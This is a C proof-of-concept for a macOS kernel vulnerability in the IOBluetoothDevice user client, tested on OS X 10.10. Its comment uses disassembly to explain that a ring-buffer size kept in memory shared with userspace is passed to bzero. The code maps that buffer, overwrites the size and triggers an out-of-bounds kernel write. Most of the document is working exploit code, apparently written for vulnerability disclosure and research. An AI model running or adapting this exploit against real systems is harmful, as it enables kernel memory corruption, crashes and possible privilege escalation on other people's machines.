/*
clang -o bluetooth_ringbuffer bluetooth_ringbuffer.c -framework IOKit
tested on: MacBookAir5,2 w/ 10.10/14A389

ianbeer

requirements: A bluetooth device must be connected (tested with an Apple bluetooth keyboard)

IOBluetoothDeviceUserClient::clientMemoryForType memory type 0xff calls
 __ZN17IOBluetoothDevice18getSCOOutputBufferEv
which calls IOBluetoothDevice::initializeRingBuffer to allocate a buffer to
map into userspace.


IOBluetoothDevice18getSCOOutputBuffer:
...
lea     rsi, [rbx+178h]  <-- pass pointer to this+0x178 in rsi
mov     edx, 3C00h
add     rsp, 8
pop     rbx
pop     rbp
jmp     rax              <-- tail call to initializeRingBuffer


IOBluetoothDevice::initializeRingBuffer(_IOBluetoothRingBuffer **, int):
...
mov     r14, rsi        <-- save pointer to this+0x178
...
call    __ZN24IOBufferMemoryDescriptor11withOptionsEjmm ; IOBufferMemoryDescriptor::withOptions(uint,ulong,ulong)
mov     r12, rax
mov     rax, [r12]
mov     rdi, r12
call    qword ptr [rax+20h] ; ::retain
mov     rax, [r12]
mov     rdi, r12
call    qword ptr [rax+2E0h] ; IOBufferMemoryDescriptor::getBytesNoCopy(void)
mov     rbx, rax                    <-- pointer to buffer in kernel space (will be shared with userspace)
lea     rdi, [rbx+10h]  ; void *
xor     esi, esi        ; int
mov     rdx, r15        ; size_t
call    _memset                     <-- clear it
mov     dword ptr [rbx], 0
mov     dword ptr [rbx+4], 0
mov     dword ptr [rbx+8], 0
mov     [rbx+0Ch], r13d             <-- write the size as the fourth dword
mov     [r14], rbx                  <-- save buffer pointer


This buffer will then be mapped into userspace.

Calling external method 4 eventually reaches the following code:
IOBluetoothDevice::startSCOOutput:

__text:0000000000030F62                 mov     rdi, [rbx+178h]            <-- pointer to shared buffer
__text:0000000000030F69                 test    rdi, rdi
__text:0000000000030F6C                 jz      loc_31039
__text:0000000000030F72                 mov     r14d, 0E00002D2h
__text:0000000000030F78                 cmp     byte ptr [rbx+188h], 0
__text:0000000000030F7F                 jnz     loc_31060
__text:0000000000030F85                 mov     esi, [rdi+0Ch]  ; size_t   <-- read size from userspace shared mem
__text:0000000000030F88                 add     rdi, 10h        ; void *
__text:0000000000030F8C                 call    _bzero                     <-- passed as size arg to bzero


Userspace can modify the size in shared memory leading to the bzero writing a controlled number of NULL bytes off the end of the buffer.
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <IOKit/IOKitLib.h>

int main(){
  kern_return_t err;

  CFMutableDictionaryRef matching = IOServiceMatching("IOBluetoothDevice");
  if(!matching){
    printf("unable to create service matching dictionary\n");
    return 0;
  }

  io_iterator_t iterator;
  err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
  if (err != KERN_SUCCESS){
    printf("no matches\n");
    return 0;
  }

  io_service_t service = IOIteratorNext(iterator);

  if (service == IO_OBJECT_NULL){
    printf("unable to find service\n");
    return 0;
  }
  printf("got service: %x\n", service);

  io_connect_t conn = MACH_PORT_NULL;
  err = IOServiceOpen(service, mach_task_self(), 0, &conn);
  if (err != KERN_SUCCESS){
    printf("unable to get user client connection\n");
    return 0;
  }

  printf("got userclient connection: %x\n", conn);


  mach_vm_address_t addr = 0x4100000000;
  mach_vm_size_t size = 0x1000;

  err = IOConnectMapMemory(conn, 0xff, mach_task_self(), &addr, &size, 0);
  if (err != KERN_SUCCESS){
    printf("IOConnectMapMemory failed:0x%x\n", err);
    return 0;
  }

  uint32_t* buf = 0;
  buf = (uint32_t*)addr;
  printf("mapped at: 0x%p size:0x%x\n", addr, size);

  // overwrite the size field
  buf[3] = 0xfffff0;

  uint64_t inputScalar[16];  
  uint64_t inputScalarCnt = 0;

  char inputStruct[4096];
  size_t inputStructCnt = 0;

  uint64_t outputScalar[16];
  uint32_t outputScalarCnt = 0;

  char outputStruct[4096];
  size_t outputStructCnt = 0;
  
  err = IOConnectCallMethod(
    conn,
    4,
    inputScalar,
    inputScalarCnt,
    inputStruct,
    inputStructCnt,
    outputScalar,
    &outputScalarCnt,
    outputStruct,
    &outputStructCnt); 

  if (err != KERN_SUCCESS){
    printf("IOConnectCall error: %x\n", err);
    return 0;
  }

  printf("probably crashing soon?\n");
  return 0;
}
